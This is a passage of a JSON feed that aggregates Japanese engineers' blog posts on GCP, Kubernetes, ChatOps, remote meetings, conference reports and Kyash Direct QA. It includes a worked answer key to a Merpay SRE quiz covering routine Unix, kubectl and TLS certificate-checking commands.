になりました。入社して2週間しかも、初日以外ずっと在宅勤務なのでまだ様子が摑めてないですが、早くキャッチアップしてバリバリ成果を出していきたい所存です。これからもよろしくお願いします。例のもの置いておきます。気が向いたらでよいです。https://www.amazon.jp/hz/wishlist/ls/3S4C1LCDWKCTM?ref_=wl_share*1:情熱プログラマ参照","link":"https://blog.masasuzu.net/entry/2020/04/12/134300","isoDate":"2020-04-12T04:43:00.000Z","dateMiliSeconds":1586666580000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"IAPに対応しているGAEにアクセスする","contentSnippet":"概要GCPにあるGAEに対してアクセスする場合、認証のためにIAPをつけることが多いハズその際にrequest clientに対して認証情報を付ける方法についてまとめるサービスアカウントを作るサービスアカウントは以下の通りに作成でき…","link":"https://qiita.com/SatohJohn/items/d21d8487f55ed911e687","isoDate":"2020-03-29T12:12:15.000Z","dateMiliSeconds":1585483935000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Vuetify.jsのリンクの違いについて","contentSnippet":"概要vuetifyのbuttonやlist-itemなどに対してnuxt linkをつける際にリンクの付け方は2つあるhreftoどう使い分けるかというと、 https://qiita.co…","link":"https://qiita.com/SatohJohn/items/881d9a6fceceda1c1ce7","isoDate":"2020-03-22T11:06:18.000Z","dateMiliSeconds":1584875178000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ruboty-githubプラグインをつくっている話","contentSnippet":"これはなにruboty-githubというRubotyプラグインを作っているのでご紹介。※ r7kamura/ruboty-githubをForkしたもの。RubotyとはRuby + Bot = Ruboty.Rubotyとは、Ruby製のbotフレームワークです。SlackやChatWorkでの会話、redisやGoogle Spreaadsheetでのデータ保持、各種APIへの接続をすることができます。また、Ruboty用プラグイン(RubyGem)を追加することで好きな機能を追加することができます。Rubotyが反応してレスポンスを返すまで外部サービスで発生したイベントがAdapterに入るイベントはMessageとしてHandlerへ正規表現でMessegeに対応するActionsをマッチしてActionsへAPIをコールしたりBrainsを使ってデータを保持したりしてReply messageを作成HandlerはActionsの返り値をMessageに返すMessageがAdapterにレスポンスruboty-githubとはRubotyからGitHub APIをコールしていろいろやるプラグインです。なぜ作っているのか着想人間は忘れる生き物人間は間違える生き物同じことを何度もやるのは苦痛どうするか人間がやることをラップして簡単に人間がやらなくていいことは自動化できることBranch作成Pull Request作成マージIssue作成CloseRelease作成リリース一覧を取得最新のリリースバージョンを取得最新のリリースとmasterの差分を取得CommitCommit間の差分を取得たとえばリリースを作成リリース一覧の取得最新のリリースバーションを取得工夫したところGitHub organization名を省略できるようにリリースタグのprefixを指定してvalidationをかけるようにリリース作成時に差分に含まれるPull Requestをdescriptionに記載できるようにまとめDevOpsにチャットツールを使うChatOpsを強化することで人的ミスを減らし、継続的なアプリケーション開発/運用に貢献していきたいです。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/03/11/000000?utm_source=feed","isoDate":"2020-03-10T15:00:00.000Z","dateMiliSeconds":1583852400000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"リモートミーティングに参加する前に読むポスト","contentSnippet":"これはなに社内外を問わず、リモートでミーティングをする機会が増えていることと思います。これからリモートミーティングに挑むぞ! という前に読んでおきたい心構えやマナーについてご紹介します。心構え編どんどん発言しよう!明るくハキハキとファシリテータが意見を引き出そう!環境準備編背景はきれいにしよう!イヤホンを使おう!ハウリング。ミーティングが大音量のキーン! からはじまるのはイヤなものです。これを防ぐにはそもそもスピーカーを使わなければよいので、イヤホンを使いましょう!僕のおすすめはEarPods(AirPods, AirPods Proも可)ですいいマイクを使おう!実践編話すとき以外はマイクをミュートにしよう!相槌は声を出さずにオーバーリアクションで!画面共有を効率的に使おう!","link":"https://pranc1ngpegasus.hatenablog.com/entry/2020/02/19/000000?utm_source=feed","isoDate":"2020-02-18T15:00:00.000Z","dateMiliSeconds":1582038000000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Merpay SRE Quiz @SRE Next 2020 解答・解説","contentSnippet":"これは何？2020年1月25日に行われた SRE NEXT 2020 で，メルペイさんがブースで出していた SRE に関するクイズです。正答数で景品がもらえたようです。3問以上：メルペイキーキャップ4問以上：メルペイキーキャップ＋メルペイ SRE が推薦する本今日は SRE NEXT に来ています！ブース出してます！メルペイSREが考えたクイズに挑戦してみてください！#srenext pic.twitter.com/sQmndWucrP— Mercari_Dev (@mercaridevjp) January 25, 2020 メルペイ SRE が推薦する本って？ツイートのスレッドをたどっていくと，ラインナップは以下のようでした。『入門 監視』『詳解 シェルスクリプト』『Kubernetes 完全ガイド』『Programming Kubernetes』『パケットキャプチャの教科書』『プロダクションレディ マイクロサービス』『Linux カーネル Hacks』『エンジニアリング組織論への招待』『エンジニアのためのマネジメントキャリアパス』名著ばかりですね。第1問 SLO とはなんの略でしょうか？選択肢Service Level Observability (サービスレベル可観測性)Service Level Objective (サービスレベル目標)System Level Observability (システムレベル可観測性)System Level Objective (システムレベル目標)正解Service Level Objective (サービスレベル目標)解説SRE 本の Chapter 4 - Service Level Objectives に書かれている定義は以下のとおりです。An SLO is a service level objective: a target value or range of values for a service level that is measured by an SLI.SLI（サービスレベル指標）の目標値または値の範囲を SLO（サービスレベル目標）といいます。第2問 ユーザーが所属しているユーザーグループを知るためのコマンドはどれか？選択肢idwhoamiwholsgroup正解id解説明示されていないですが，UNIX 系 OS のコマンドを前提としていますね。id：ユーザー情報を表示するコマンドで，ユーザー情報（ID，名前）とグループ情報（ID，名前）が表示されます。実行例：foobar@darkstar:~$ iduid=1016(foobar) gid=100(users) groups=100(users)whoami：実行ユーザーの ID を表示するコマンドです。id -un と等価です。who：実行ユーザーの情報（名前，プロセス，起動時刻など）を表示するコマンドです。lsgroup：グループの属性を表示する AIX（IBM の UNIX 系 OS）のコマンドです。デフォルトパラメータがないので，グループを指定するか ALL を指定する必要があります。これらのうち，ユーザーの所属グループが表示されるのは id コマンドです。第3問 $ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\" の出力結果はどれか？選択肢33 2 1error1正解3 2 1解説bash -c string：string が bash で実行されます。echo message：message と改行を出力します。パイプ |：コマンドの出力を次のコマンドの標準入力に渡します。ここでは，3 2 1\\\\n を awk コマンドの標準入力に渡します。awk \'パターン {アクション}\'：AWK のコマンドで，入力に対してパターンにマッチしたものにアクションを適用します。パターンを省略（空パターン）すると，全パターンにマッチする扱いになります。$ bash -c \\"... $1 ...\\"：\\"\\" で囲まれた$ は展開されます。1 という変数名は定義されていないので，$1 が展開されると空文字になります。AWK に伝わるスクリプトは \'{print }\' になり，全パターンに対してそのまま出力する挙動になります。したがって，$ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\"3 2 1となります。ちなみに，1番目のフィールドを表示させたい場合は，$ が展開されないように \\\\$ とエスケープします。$ bash -c \\"echo 3 2 1 | awk \'{print \\\\$1}\'\\"3bash -c \\"...\\" を噛まさなければ，シングルクォート \'\' で囲まれた $ が展開されず，意図通りの挙動になります。$ echo 3 2 1 | awk \'{print $1}\'3エスケープ・展開絡みの落とし穴を題材にした問題ですね。調べてみたら複数事例見つかり，ハマりポイントのようです。stackoverflow.comteratail.com第4問 DNS が使用するポート番号は何番ですか？選択肢225380443正解53解説すべて well-known ポート番号です。22：SSH53：DNS80：HTTP443：HTTPS第5問 Kubernetes の Deployment の Event を見られるコマンドは，以下のうちどれか？選択肢kubectl describe <Deployment Name>kubectl logs -l <Deployment Label>kubectl get deployment <Deployment Name> -o yamlkubectl logs <Deployment Name>正解kubectl describe <Deployment Name>解説kubectl describe：リソースの詳細な情報を出力します。Events: セクションにイベント情報が表示されます。kubectl get events コマンドで全リソースのイベントを表示することができます。kubectl logs：コンテナのログを出力します。--selector (-l) オプションで結果にフィルタをかけることができます。kubectl get：リソースの基本的な情報を取得します。kubectl get deployment <Deployment Name> -o yaml とすると，Deployment の定義を YAML 形式で出力します。kubectl describe コマンドの引数で Deployment の名称を指定すると，その Deployment に関連したイベントを取得できるので，kubectl describe <Deployment Name> が正解です。第6問 Web サイトに設定している TLS 証明書の有効期限を確認できるコマンドは以下のうちどれか？選択肢openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep Aftercurl --tlsv1.2 -l https://www.merpay.com | grep Expirewget --no-check-certificate https://www.merpay.com | grep Certnmap --script ssl-enum-ciphers -p 443 www.merpay.com | grep Date正解openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep After解説openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text：OpenSSL の SSL/TLS クライアントで指定されたホストに接続して証明書を取得し，x509 サブコマンドで証明書情報を取り出します。Not After : で始まる行に有効期限が書かれるので，grep で取り出せます。-text オプションの代わりに -dates オプションを指定すると，証明書の開始日と失効日だけが出力されます。curl --tlsv1.2 -l https://www.merpay.com：Response Body（ここでは HTML）が出力されます。TLS 証明書の情報は含まれません。wget --no-check-certificate https://www.merpay.com：指定した URL の内容を証明書の検証をせずにダウンロードしてファイル（ここでは index.html）に保存します。標準出力にはリクエストの実行ログが吐かれますが，TLS 証明書の情報は含まれません。nmap --script ssl-enum-ciphers -p 443 www.merpay.com：Nmap を用い，指定されたホストに対して SSL/TLS の暗号・圧縮方式を複数試行した結果を出力します。証明書の有効期限の情報は含まれません。実行例：PORT    STATE SERVICE REASON443/tcp open  https   syn-ack| ssl-enum-ciphers:|   TLSv1.0:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|       Weak certificate signature: SHA1|   TLSv1.2:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|_  least strength: CcURL，Nmap で実現する例は以下のとおりです。curl --tlsv1.2 -v https://www.merpay.com 2>&1 | grep expirenmap --script ssl-cert -p 443 www.merpay.com | grep afterserverfault.com感想骨のある問題が多いです。1，4を確実に正解して，その他をどれだけ正解できるかといった感じでしょうか。知らなければ調べればいい話ですが，業務でよく使うコマンドなら覚えておいて手足のように使いこなせるほうが望ましいでしょう。","link":"https://toshikish.hateblo.jp/entry/2020/02/11/024400","isoDate":"2020-02-10T17:44:00.000Z","dateMiliSeconds":1581356640000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2019年のふりかえり、2020年の目標","contentSnippet":"すでに年が明けて1ヶ月経ちましたが、2019年の活動を振り返ろうと思います。Kubernetes、Cloud Native技術を中心に学習を進めました。勉強会、カンファレンス1月Cloud Native Meetup Tokyo #6 KubeCon + CNCon RecapKubernetes Meetup Tokyo #15 - KubeCon 2018 RecapRancher/Kubernetes勉強会　Kubernetes管理ツールの活用法OWASP Connect in Tokyo #2今回は特別編！Cloud Nativeなアプリ開発から学んだことを全部シェア - cndjp#92月Yahoo! JAPAN MEETUP #31 インフラ技術カンファレンスGo 1.12 Release Party in Tokyo w/ Fukuoka&Umedassmjp 2019/02Docker Meetup Tokyo #28第三回ボトムアップドメイン駆動設計サイバーセキュリティシンポジウム3月k8s source code reading #3Cloud Native Meetup Tokyo #7 @Abema Towers4月Cloud Native Tokyo #01Serverlessについて思いを馳せる一夜 - cndjp第11回勉強会ssmjp 2019/04Rancher k3s もくもく勉強会 #035月レガシーをぶっつぶせ。現場でDDD！ssmjp 2019/05IIJ Technical NIGHT vol.7SRE Lounge #9Docker Meetup Tokyo #30 (DockerCon・KubeConEU報告会)Yahoo! JAPAN MEETUP #32 インフラ技術／Kubernetes6月NoOps Meetup Tokyo #6Kubernetes Meetup Tokyo #20 - KubeCon RecapGCPUG Tokyo Next Extended 2019 Infra DayInteract 20197月恐るることなかれ! Cloud NativeリレーショナルDB特集!! - cndjp第12回第三十五回 Azureもくもく会 @ 品川CloudNative Days Tokyo Meetup w/ Melanie CebulaKubernetes Meetup Tokyo #21 - Cloud Native CI/CDSekkeiKaigiCloud Native Days Tokyo 2019 → スタッフとして参加8月SRE Lounge #10CloudNative Days Tokyo 2019振り返りNightGo 1.13 Release Party in TokyoKubernetes Meetup Tokyo #229月Docker Meetup Tokyo #32Japan Azure User Group 9周年イベントXP祭り2019golang.tokyo #26Cloud Native Meetup Tokyo #10Kubernetes Meetup Tokyo #23 - Operator Deep Dive10月Terraform meetup tokyo#2Kubernetes Meetup Tokyo #24SRE Lounge #1111月さくらの夕べDocker/Kubernetesナイト #2Go Release 10 Year Anniversary Party in Tokyoゴリラ.vim #10 非公式VimConf後夜祭 girls.vimと合同開催技術書典8 はじめてのサークル参加meetupMicrosoft Open Tech Night #1 - インフラ編+Ignite速報俺たちの最適なCloud Nativeを求めて…。本気のこと始め！ - cndjp第13回12月Japan Rook Meetup #1Cloud Native Meetup Tokyo #11 KubeCon RecapGDG DevFest Tokyo 2019Microsoft Open Tech Night #3 - クラウドネイティブ編登壇資料speakerdeck.comspeakerdeck.comspeakerdeck.com書籍商業誌Kubernetes完全ガイドしくみがわかるKubernetesみんなのDocker/KubernetesKubernetes実践入門情報処理安全確保支援士 教科書みんなのGo言語インフラエンジニアの教科書Linuxのしくみ分散システムデザインパターン入門監視Linux教科書 LPICレベル1Docker実践ガイドKubernetes実践ガイド同人誌ふりかえり読本 場作り編ふりかえり読本 学び編ふりかえり読本 実践編理論と事例でわかる自己肯定感理論と事例でわかるモチベーション現場の「ズレ」を解消するコミュニケーションメソッド 第2版会話の引き出しを増やす 1on1カード と 使いこなしブックPrometheusでKubernetesを監視する本Kubernetes-Native Development & Deployment実践入門 Kubernetes カスタムコントローラへの道Knativeの歩き方資格情報処理安全確保支援士LPIC 101、102ツール・技術DockerKubernetesHelmPrometheusGrafanaLokiArgo CDConcourseTerraformTelepresencecert-managerWindowsコンテナMicrosoft AzureGo言語Vue.js社内での活動定期勉強会を主催ふりかえりを実施、ファシリテーター役Dockerワークショップを開催2020年の目標2020年もCloud Nativeを突き進む予定です。マストCKA、CKADを取得するコミュニティに貢献するOSSにコントリビュートするGo言語でのプログラミングに慣れる英語力を高めるできれば業務としてKubernetesを扱える環境に身を置く（遠回しな表現）技術書を書く","link":"https://kyohmizu.hatenablog.com/entry/2020/02/01/040351","isoDate":"2020-01-31T19:03:51.000Z","dateMiliSeconds":1580497431000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"テストで使いたくて，DinD (Docker in Docker) でk8sの環境を整えた","contentSnippet":"TL;DRこちらのDockerfileを見納めくださいkindとアプリケーションのコンテナを分けても良かったのですが，kubeconfigの受け渡しが面倒だったので妥協しましたhttps://…","link":"https://qiita.com/tozastation/items/eafde1a75c35bb9d1a68","isoDate":"2019-12-30T14:30:36.000Z","dateMiliSeconds":1577716236000,"authorName":"tozastation","authorId":"tozastation"},{"title":"0からはじめる Windows on Kubernetes","contentSnippet":"はじめにKubernetes の Windows 対応は v.1.14 でGAとなりました。本記事では、既存の Kubernetes クラスタに0から Windows ワーカーノードを追加する方…","link":"https://qiita.com/kyohmizu/items/dffdd49123b1e47c3ac4","isoDate":"2019-12-22T18:19:52.000Z","dateMiliSeconds":1577038792000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Merpay Tech Talk vol. 2に行ってきた","contentSnippet":"2019年12月18日、Merpay社主催のTech Talk vol.2に行ってきたので学んだことをまとめる。Merpay Tech Talkとは毎回各テーマに興味のあるエンジニアたちが集まり、技術的な知見を共有しあうことを目的とした勉強会です。 - Connpass説明分よりとのこと。今回のテーマは「マイクロサービスの冪等性」ということで、同じマイクロサービスを扱う身としてどんなことに気をつけて設計しているのか学んできた。Talk 1:\xa0500万ユーザーを支える残高の冪等性 speakerdeck.com全体像はこの資料にある模様。特に強調していたのは冪等性を担保するために検証する要素として冪等性キー(UUID v4を採用)の他にペイロードの中身も検証対象にしているという点で、冪等性キーだけを見て判断するのではなく、リクエスト内容も検証することでたまたま同じ冪等性キーが発行されてしまった場合にも冪等性を担保できることを考えて設計しているとのこと。しかし、これを実現するにはチームや他のサービスとの協力が必要なので、チーム内外のコミュニケーションは大事である旨も強調していた。Talk 2:\xa0コード決済における冪等性と整合性 speakerdeck.comエラーが返ってきたはずなのに実際には残高が動いていたとか、特にお金に関わる問題があるとサービスの信頼性を失ってしまうし、マイクロサービスアーキテクチャでサービス間の整合性を保つことはDBの点在など関連する要素が多く非常に難しいので、マイクロサービス間でリトライを何度しても不整合が発生してしまう状況を考えて定期的にバッチで不整合を修復しているとのこと。ある一定期間は不整合が生じてしまうが、最終的に整合がとれるようにするにはバッチ処理を使った修復は必須だと考えているとのこと。同期的に処理をするのは決済リクエストを受けてからレスポンスを返す部分だけで、サービスごとに内部的なステートを遷移させる処理は非同期で行っている部分が興味深かった。Talk 3:\xa0バッチ処理と冪等性 speakerdeck.comバッチ処理は、常に動いていないサービスである分失敗しやすいからリトライしやすいように作っているとのこと。バッチ処理を冪等に設計するメリットは、なにかバグを発見したときに原因を修正したらもう一回流すことで回復できる部分であるとのこと。たしかに、何度繰り返し処理をしても結果が変わらない設計をしていれば特別なリトライ方法を用意する必要がなくて運用がシンプルになると感じた。まとめ冪等生の担保の前に、リトライは必ず必要になるという理解が必要だと感じた。リトライ処理をいかにシンプルにできるかを考えると、おのずと冪等生確保につながると感じた。常に冪等性を意識したサービス作りが保守運用をシンプルにしたり、もしものときに回復までの時間を短縮できたりすることに繋がると感じた。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2019/12/21/000000?utm_source=feed","isoDate":"2019-12-20T15:00:00.000Z","dateMiliSeconds":1576854000000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Knative Serving in Production","contentSnippet":"概要Knative Serving は、ステートレスなアプリケーションを対象に、HTTP リクエスト駆動で自動スケールする仕組みを提供します。Kubernetes (K8s) と Ingress (Isti…","link":"https://qiita.com/toVersus/items/1317a31fead9b836a68d","isoDate":"2019-12-18T22:00:21.000Z","dateMiliSeconds":1576706421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"キャリアアップ支援制度を利用してArchitecting on AWSを受講しましたというアドベントカレンダー書いてました","contentSnippet":"tech.mobilefactory.jpだいぶ前に受けたArchitecting on AWSの聴講記録です。","link":"https://blog.masasuzu.net/entry/2019/12/15/004259","isoDate":"2019-12-14T15:42:59.000Z","dateMiliSeconds":1576338179000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GDG DevFest Tokyo 2019に行ってきた","contentSnippet":"tokyo.gdgjapan.org珍しく、何も予定が入ってない土曜日だったので、行ってきました。最近GCPを触る機運が出てきたのでちょうどいいタイミングでした。以下メモGCP 101 | 坂田 純 | GDG DevFest Tokyo 2019主にCloudRunの話。HTTPをlistenするコンテナを起動するサービス。使った分だけ課金対象となる。リクエスト数次第で自動的にスケールする。とお手軽にできそうな印象。インターフェースがHTTPなので基本的にはパブリックでアクセス出来てしまうが、--no-allow-unauthticatedオプションをつけてデプロイするとで限られた人だけ実行できるようになります。これでバッチ的なことができそう?マイクロサービスの開発とテストファースト/テスト駆動開発 | 柴田 芳樹 | GDG DevFest Tokyo 2019ちょいちょいブログとかは見てましたが、話を聞くのは初めてでした。還暦を迎えてもコードをバリバリ書いてるのは素直に尊敬します。メルペイのマイクロサービスのテストにも興味深かったですが、組み込みでのテストの話も興味深く聴かせてもらいました。ツールや環境の充実度の差はあれど、組み込みでもウェブでもやるべきことは同じなのだなと思いました。CloudNative 時代における GKE/Kubernetes ではじめる開発 | 青山 真也 | GDG DevFest Tokyo 2019k8sの紹介的な話。k8s好きになりました。話がすごいうまくて、めんどくさそうだなあと思ってたkubernetesの印象が変わりました。その他:D社のブースを覗いたらMOVの構成図が展示されていて、IoT関連だけAWSを使っていてそれ以外はGCPを使ってるのが興味深かった。IoT関連のものも別で実装して、AWSからは引き上げるようなことを言ってて、なるほどなあとなりました。基本的にAWSで構成されたインフラばかり見てたのでなかなか新鮮でした。","link":"https://blog.masasuzu.net/entry/2019/12/14/000000","isoDate":"2019-12-13T15:00:00.000Z","dateMiliSeconds":1576249200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"【イベント参加レポート】Microsoft Ignite The Tour Tokyo","contentSnippet":"2019/12/5(木)、6(金)に開催された Microsoft の Tech イベントに参加しました。www.microsoft.com概要アメリカで行われた Ignite のセッションを再演登壇者は他人の資料で発表 (翻訳以上の改変はできないと聞きました)新情報の発表等はされず、通常セッションとハンズオンのみMicrosoft エキスパートとの交流の場外国人のスタッフを多数配置基本的には英語でやり取りするらしい (私は話しませんでした)感想外国人が多く、グローバルな印象を受けました。会場はいつものホテルでしたが、やはりセッションの入れ替え時は非常に混雑します。ブースのエリアはスペースを広くとってあり、割と閑散としていた気がします (セッション中は特に)。技術的には初級者向けの内容が多かったと思います。セッションよりは、どちらかといえばコミュニケーションを重視したイベントのようでした。MSの方やブースの担当者と話すことができ、有意義な時間を過ごせました。参加して得るものはありました。セッション参加セッションのまとめとメモ。THR30031 - Azure とコマンドライン－オプション、ヒント、テクニック難易度：初級メモエクスプローラーでcmdをパスに入力(powershell、wslも)Windows Console → Windows TerminalTerminalはStoreで入手可能Azure CLIやVSCode RemoteはサラッとAPPS30 - コンテナーを利用したアプリケーションの最新化資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps30難易度：初級要点コンテナ、Dockerの基礎的な説明コンテナランタイムやマルチステージビルド等は、軽く話に出る程度コンテナに関しては特に知らない話はなかったACRやACIの概要、使い方の軽い説明サービス移行のデモではコンテナ化してApp Service、CosmosDB、SQL Databaseを使用メモデータセンターのアプリをクラウドにLift&Shift仮想マシンはいいけど無駄が多いコンテナを使ったモダナイゼーションアプリの境界を明確にする旧バージョンの残りファイルがなくなるオーバーヘッドなしでリソース分離繰り返し可能なビルド、環境構築コンテナを使う理由あらゆる環境で同じように動作するベロシティの向上コンテナの仕組み高度に構成されたプロセスcgroupsnamespaceベースイメージからの差分をgzip化したものコンテナランタイムの軽い説明Docker以外にも対応、containerd、runCDockerfileイメージのビルド方法を説明するテキストファイルバッチスクリプトみたいなものビルドリポジトリACRACIサーバーレスのコンテナ実行環境ハイパーバイザーレベルの分離デモサービス移行の話APPS40 - インフラストラクチャと Azure Kubernetes Service を統合する資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps40難易度：中級要点AKSの作成手順の説明AKSとAzureの連携サービスについて知識を整理できたオートスケールの話は理解が浅かったので参考になったAKSを使う最大のメリットはAzureADとの連携ネットワークとセキュリティの話は非常に参考になったネットワークポリシーやAZメモ基本的な使い方ではなく、発展的な内容Tailwind Tradaersのデモ経営、ビジネス課題に対応復元力セキュリティ柔軟性スケールKubernetesを選択する理由抽象化のための標準化されたAPI自己修復スケーラビリティk8sアーキテクチャAKSはマスターノードが無料で提供されるネットワークに2種類指定できるデフォルトはkubenetAzure CNI 仮想ネットワークを使用。大規模ネットワークに対応。きちんと設計する必要があるACIを仮想ノードとして使用AZAKSの作成リソースグループ仮想ネットワークサブネットサービスプリンシパル(k8sから他のリソースを作成)クラスタ本番クラスタを作成するにはオプションを多数指定する必要がある作成時にしか設定できないオプションがあるインストール時にCNI、AZの設定をする仮想ノードの有効化ACIをAKSから使えるようにする必要があるRabbitMQ is 何？HPAメトリクスサーバーにPodから情報が送られる閾値を超えたらスケールクラスタオートスケーラーノードのスケール仮想ノードLinux、Windows、GPUに対応nodeselectorで指定仮想ノードによるスケールのデモネットワークとセキュリティACRでコンテナの脆弱性をチェックAKSを使う最大のメリットはAzureADとの連携！Azure Key VaultPod間の通信Pod IdentityNMI Server(Daemonset)MICAzure Identity BindingネットワークポリシーPod間トラフィックの保護Azure Network PolicyAzure CNIを使ったPodブリッジレベルCalico Network PolicyカーネルレベルAZベータ版データセンター障害の回復性ゾーンは3つまで使用可能ゾーンの数に合わせてレプリカ数を設定THR10007 - ITと技術者の将来について語り合うエモい話要点ディスカッション形式コミュニティ参加やアウトプットを重視しているどんどんチャレンジしてスキルをつけていくことが大事メモ今後あるいは10年後どうなる？これからチャレンジしたいことは？MRフリーランス自分の営業をこれからも続けていく自分が何が得意で、何が苦手かアピールブルーオーシャンを探したいコミュニティのエンパワーメント出てこない人にどうやって技術を好きになってもらうか社内コミュニティを作ってもらうお勧めしたいことは？技術を楽しんで、周りに広めていく仲間ができてコミュニティができる人を変えるのは難しい、好きなことを広めることならできる楽しんでる雰囲気を出していると向こうから来てくれる自分の強みを知って、それを発信していく業務で触ってなくてもコミュニティで発表いていたやりたいこと、好きなことを見つけて、人が見える場所に出していく外のコミュニティに参加してみる会社にいるだけではスキルはプロジェクト依存コミュニティの熱量がすごいアウトプットすると強い人がインプットをくれるとりあえず踏み出してみる楽しんだもの勝ちやりたいことを素直にやってみるUNC10013 - Vue.js 3 に向けた Vue.js 入門難易度：初級～中級要点Vue.js の設計思想、V3 でも使える構文、V3 の新機能コンポジッションAPI関数ベースで提供される APIコンポーネントのロジックが綺麗になるV2 でもお試しで使えるブース立ち寄ったブースの中で、興味を持った内容を紹介します。LenovoLenovo ThinkSystem SE350 | レノボジャパン軽量でコンパクトなエッジサーバーWifi、LTE、有線ネットワーク対応Intel製品概要: OpenVINO™ ツールキットエッジでのディープラーニング推論アプリケーション開発学習済みモデルを無料で利用可能インテルCPUに対応PivotalAzure Spring Cloud | Microsoft DocsSpring Boot アプリをクラウドで実行ベータ版のサービスAKS 上にデプロイされる水平スケールやメトリクス、ログの収集が可能AKS は隠蔽されているため、ユーザーからは見えない手軽に導入できるので POC にも適している","link":"https://kyohmizu.hatenablog.com/entry/2019/12/10/012041","isoDate":"2019-12-09T16:20:41.000Z","dateMiliSeconds":1575908441000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kyash DirectのQA ~現在とこれから~","contentSnippet":"この記事はKyash Advent Calendar 2019 5日目の記事です。これはなに株式会社Kyashが2019年4月に発表したカード決済プラットフォームであるKyash DirectのQA(Quality Assurance)=品質保証について、現在の体制とこれからの野望の話を綴っていきます。自己紹介2019年4月にKyashへ入社し、Kyash Directのサーバサイドエンジニアとして日々開発業務を行っています。Kyash Directのアーキテクチャ品質保証について説明する前に、Kyash Directのアーキテクチャについて簡単に説明します。            横文字だけ並べてもわからないので、弊社エンジニアがbuilderscon tokyo 2019に登壇した際の資料を拝借して簡単に解説していきます。マイクロサービスアーキテクチャマイクロサービスアーキテクチャとは、サービスを構成する各要素を「マイクロサービス」と呼ばれる小さなサービスとして実装する方法で、反対語はモノリシックアーキテクチャです。Event sourcingEvent Sourcingとは、各サービスで発生した事実をイベントという形で発信したり、各サービスがイベントに自ら反応して動作したりするアプリケーションモデルで、反対語はState sourcingです。Kyash DirectのQA ~現状編~なにを提供しているのかKyash Directは、同サービスを導入する企業(以下: パートナー企業)に対してWeb APIを提供しています。接続はHTTP、データ形式はJSONのいわゆるフツーのRESTful APIです。Web APIのテストKyash Directにとって、APIはパートナー企業と接続する唯一の口であるため、品質管理は欠かせません。APIトリガではない機能のテストKyash Directでは前述の通り、Event sourcingを採用しています。そのため、必ずしも各サービスの機能がAPIコールによって動作するとは限りません。課題Kyash 